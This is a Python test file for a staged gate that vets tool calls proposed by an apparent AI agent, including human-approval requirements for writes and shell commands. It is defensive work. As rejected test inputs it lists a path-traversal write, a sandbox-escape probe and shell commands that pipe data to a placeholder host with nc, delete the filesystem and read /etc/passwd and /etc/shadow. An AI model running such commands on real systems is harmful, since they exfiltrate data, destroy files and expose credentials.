import json

from tal.action_gate import ActionGate
from tal.capability import compute_envelope
from tal.context_packer import ExecutionPhase
from tal.proposal_types import ActionProposal


def test_action_gate_stage1_schema_failure():
    gate = ActionGate()
    caps = compute_envelope(["calc"], {"calc": 1})
    prop = ActionProposal(thought="", tool_name="calc", tool_args='{"invalid_param": "2+2"}')
    
    res = gate.evaluate(prop, caps)
    assert res.allowed is False
    assert res.stage_failed == "Stage 1: Schema Conformance"


def test_action_gate_stage2_capability_clearance_failure():
    gate = ActionGate()
    caps = compute_envelope(["calc"], {"calc": 1, "write_file": 2}, policy_denials={"write_file": "Read-only mode"})
    prop = ActionProposal(thought="", tool_name="write_file", tool_args='{"path": "a.txt", "content": "x"}')
    
    res = gate.evaluate(prop, caps)
    assert res.allowed is False
    assert res.stage_failed == "Stage 2: Capability Clearance"


def test_action_gate_stage3_phase_boundary_failure():
    gate = ActionGate()
    caps = compute_envelope(["write_file"], {"write_file": 1})
    prop = ActionProposal(thought="", tool_name="write_file", tool_args='{"path": "a.txt", "content": "x"}')
    
    # write_file is not allowed in DISCOVERY phase
    res = gate.evaluate(prop, caps, phase=ExecutionPhase.DISCOVERY)
    assert res.allowed is False
    assert res.stage_failed == "Stage 3: Effect Boundary Check"


def test_action_gate_stage4_path_traversal():
    gate = ActionGate()
    caps = compute_envelope(["write_file"], {"write_file": 1})
    prop = ActionProposal(thought="", tool_name="write_file", tool_args='{"path": "../../../outside.txt", "content": "x"}')
    
    res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)
    assert res.allowed is False
    assert res.stage_failed == "Stage 4: Parameter Sanitization"


def test_action_gate_stage5_approval_flag():
    gate = ActionGate()
    caps = compute_envelope(["write_file", "calc", "run_command"], {"write_file": 1, "calc": 1, "run_command": 1})
    
    # calc -> safe -> no approval
    prop_calc = ActionProposal(thought="", tool_name="calc", tool_args='{"expression": "1+1"}')
    res_calc = gate.evaluate(prop_calc, caps, phase=ExecutionPhase.EXECUTION)
    assert res_calc.allowed is True
    assert res_calc.requires_approval is False

    # writes are side effects and always require explicit approval
    prop_write = ActionProposal(thought="", tool_name="write_file", tool_args='{"path": "safe.txt", "content": "x"}')
    res_write = gate.evaluate(prop_write, caps, phase=ExecutionPhase.EXECUTION)
    assert res_write.allowed is True
    assert res_write.requires_approval is True

    # run_command -> confirm policy -> requires approval
    prop_cmd = ActionProposal(thought="", tool_name="run_command", tool_args='{"command": "pytest"}')
    res_cmd = gate.evaluate(prop_cmd, caps, phase=ExecutionPhase.EXECUTION)
    assert res_cmd.allowed is True
    assert res_cmd.requires_approval is True


def test_action_gate_stage4_shell_metacharacter_rejection():
    gate = ActionGate()
    caps = compute_envelope(["run_command"], {"run_command": 1})

    # Each disallowed metacharacter should be blocked
    dangerous_commands = [
        "echo hello & whoami",      # & - command chaining
        "cat file | nc evil 4444",  # | - pipe
        "ls; rm -rf /",             # ; - statement separator
        "echo $HOME",               # $ - variable expansion
        "echo `whoami`",            # ` - command substitution
        "cat /etc/passwd > out",    # > - redirect
        "cat < /etc/shadow",        # < - redirect
        "echo hello\nwhoami",       # \n - newline injection
    ]
    for cmd in dangerous_commands:
        prop = ActionProposal(
            thought="", tool_name="run_command",
            tool_args=json.dumps({"command": cmd})
        )
        res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)
        assert res.allowed is False, f"Should block: {cmd}"
        assert res.stage_failed == "Stage 4: Parameter Sanitization"
        assert "metacharacters" in res.reason


def test_action_gate_stage4_python_ast_safety():
    gate = ActionGate()
    caps = compute_envelope(["python_repl"], {"python_repl": 1})

    prop = ActionProposal(
        thought="", tool_name="python_repl",
        tool_args=json.dumps({"code": "x = ''.__class__.__subclasses__()"})
    )
    res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)
    assert res.allowed is False
    assert res.stage_failed == "Stage 4: Parameter Sanitization"


def test_action_gate_rejects_python_syntax_before_execution():
    gate = ActionGate()
    caps = compute_envelope(["python_repl"], {"python_repl": 1})
    prop = ActionProposal(
        thought="", tool_name="python_repl", tool_args=json.dumps({"code": "for value in:"})
    )

    res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)

    assert res.allowed is False
    assert res.stage_failed == "Stage 4: Parameter Sanitization"
    assert "syntax error" in res.reason.lower()


def test_action_gate_repl_block_includes_safe_alternative():
    gate = ActionGate()
    caps = compute_envelope(["python_repl"], {"python_repl": 1})
    prop = ActionProposal(thought="", tool_name="python_repl", tool_args=json.dumps({"code": "print(type(items))"}))

    res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)

    assert res.allowed is False
    assert "isinstance" in res.reason


def test_action_gate_full_pipeline_pass():
    gate = ActionGate()
    caps = compute_envelope(["run_command"], {"run_command": 1})

    prop = ActionProposal(
        thought="checking version", tool_name="run_command",
        tool_args=json.dumps({"command": "python --version"})
    )
    res = gate.evaluate(prop, caps, phase=ExecutionPhase.EXECUTION)
    assert res.allowed is True
    assert res.stage_failed is None
    assert res.sanitized_args is not None
    assert res.sanitized_args["command"] == "python --version"


def test_missing_read_file_target_is_never_guessed():
    gate = ActionGate()
    caps = compute_envelope(["read_file"], {"read_file": 1})
    result = gate.evaluate(
        ActionProposal(thought="", tool_name="read_file", tool_args="{}"),
        caps, phase=ExecutionPhase.EXECUTION,
    )
    assert not result.allowed
    assert result.stage_failed == "Stage 1: Schema Conformance"
